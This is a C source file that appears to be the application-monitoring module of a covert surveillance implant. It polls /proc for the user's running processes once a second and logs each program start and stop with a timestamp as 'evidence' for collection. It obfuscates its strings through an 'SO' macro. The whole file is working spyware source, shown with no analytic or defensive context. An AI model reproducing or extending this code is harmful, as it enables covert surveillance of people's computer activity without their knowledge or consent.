#define _BSD_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <time.h>
#include <glob.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/select.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "bioutils.h"

struct list {
   char *app;
   struct list *n;
};

static int listadd(char *app, struct list **l);
static void listcmp(struct list *lin1, struct list *lin2, struct list **lout1, struct list **lout2);
static void listfree(struct list *l);

void *module_application_main(void *args)
{
   BIO *bio_data = NULL;
   char *dataptr = NULL;
   long datalen;
   fd_set rfds;
   struct timeval tv;
   glob_t g;
   int i;
   FILE *fp;
   char buf[256], *app;
   struct list *new = NULL, *old = NULL, *started = NULL, *stopped = NULL, *listp = NULL;
   struct stat s;
   uid_t uid;
   struct tm t;
   time_t now;

   debugme("Module APPLICATION started\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      uid = getuid();
      while(MODULE_APPLICATION.status != MODULE_STOPPING) {
         do {
            memset(&g, 0x00, sizeof(g));
            if(glob(SO"/proc/[0-9]*/cmdline", 0, NULL, &g)) break;

            listfree(old);
            listfree(started);
            listfree(stopped);
            old = new;
            new = NULL;
            started = NULL;
            stopped = NULL;

            for(i = 0; i < g.gl_pathc; i++) {
               if(stat(g.gl_pathv[i], &s)) continue;
               if(s.st_uid != uid) continue;
               if(!(fp = fopen(g.gl_pathv[i], "r"))) continue;
               if(fgets(buf, sizeof(buf), fp)) {
                  if((app = strrchr(buf, '/'))) {
                     app++;
                  } else {
                     app = buf;
                  }
                  listadd(app, &new);
               }
               fclose(fp);
            }
            if(!new || !old) break;

            listcmp(new, old, &started, &stopped);

            now = time(NULL);

            for(listp = started; listp; listp = listp->n) {
               debugme("APPLICATION start %s\n", listp->app);
               memset(&t, 0, sizeof(t));
               if(now) if(gmtime_r(&now, &t)) {
                  t.tm_mon++;
                  t.tm_year += 1900;
               }
               BIO_write(bio_data, &t.tm_sec, 4);
               BIO_write(bio_data, &t.tm_min, 4);
               BIO_write(bio_data, &t.tm_hour, 4);
               BIO_write(bio_data, &t.tm_mday, 4);
               BIO_write(bio_data, &t.tm_mon, 4);
               BIO_write(bio_data, &t.tm_year, 4);
               BIO_write(bio_data, &t.tm_wday, 4);
               BIO_write(bio_data, &t.tm_yday, 4);
               BIO_write(bio_data, &t.tm_isdst, 4);
               BIO_puts16n(bio_data, listp->app);
               BIO_puts16n(bio_data, SO"START");
               BIO_write(bio_data, "\x00\x00", 2);
               BIO_write(bio_data, "\xDE\xC0\xAD\xAB", 4);
            }
            for(listp = stopped; listp; listp = listp->n) {
               debugme("APPLICATION stop %s\n", listp->app);
               memset(&t, 0, sizeof(t));
               if(now) if(gmtime_r(&now, &t)) {
                  t.tm_mon++;
                  t.tm_year += 1900;
               }
               BIO_write(bio_data, &t.tm_sec, 4);
               BIO_write(bio_data, &t.tm_min, 4);
               BIO_write(bio_data, &t.tm_hour, 4);
               BIO_write(bio_data, &t.tm_mday, 4);
               BIO_write(bio_data, &t.tm_mon, 4);
               BIO_write(bio_data, &t.tm_year, 4);
               BIO_write(bio_data, &t.tm_wday, 4);
               BIO_write(bio_data, &t.tm_yday, 4);
               BIO_write(bio_data, &t.tm_isdst, 4);
               BIO_puts16n(bio_data, listp->app);
               BIO_puts16n(bio_data, SO"STOP");
               BIO_write(bio_data, "\x00\x00", 2);
               BIO_write(bio_data, "\xDE\xC0\xAD\xAB", 4);
            }
            if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;

            /* TODO XXX creare la evidence sequenziale */
            evidence_write(EVIDENCE_TYPE_APPLICATION, NULL, 0, dataptr, datalen);
         } while(0);
         globfree(&g);
         BIO_reset(bio_data);

         FD_ZERO(&rfds);
         FD_SET(MODULE_APPLICATION.event, &rfds);
         tv.tv_sec = 1;
         tv.tv_usec = 0;
         select(MODULE_APPLICATION.event + 1, &rfds, NULL, NULL, &tv);
      }
   } while(0);
   if(old) listfree(old);
   if(new) listfree(new);
   if(started) listfree(started);
   if(stopped) listfree(stopped);
   if(bio_data) BIO_free(bio_data);

   debugme("Module APPLICATION stopped\n");
 
   return NULL;
}

static int listadd(char *app, struct list **l)
{
   struct list *lp;

   if(!*l) {
      if(!(*l = malloc(sizeof(struct list)))) return -1;
      lp = *l;
   } else {
      for(lp = *l; lp; lp = lp->n) {
         if(!strcasecmp(lp->app, app)) return 0;
         if(!lp->n) break;
      }
      if(!(lp->n = malloc(sizeof(struct list)))) return -1;
      lp = lp->n;
   }
   lp->app = strdup(app);
   lp->n = NULL;

   return 1;
}

static void listcmp(struct list *lin1, struct list *lin2, struct list **lout1, struct list **lout2)
{
   struct list *lp1, *lp2;

   for(lp1 = lin1; lp1; lp1 = lp1->n) {
      for(lp2 = lin2; lp2; lp2 = lp2->n) {
         if(!strcasecmp(lp1->app, lp2->app)) break;
      }
      if(!lp2) listadd(lp1->app, lout1);
   }

   for(lp2 = lin2; lp2; lp2 = lp2->n) {
      for(lp1 = lin1; lp1; lp1 = lp1->n) {
         if(!strcasecmp(lp2->app, lp1->app)) break;
      }
      if(!lp1) listadd(lp2->app, lout2);
   }

   return;
}

static void listfree(struct list *l)
{
   struct list *lp;

   while(l) {
      lp = l->n;
      if(l->app) free(l->app);
      free(l);
      l = lp;
   }

   return;
}
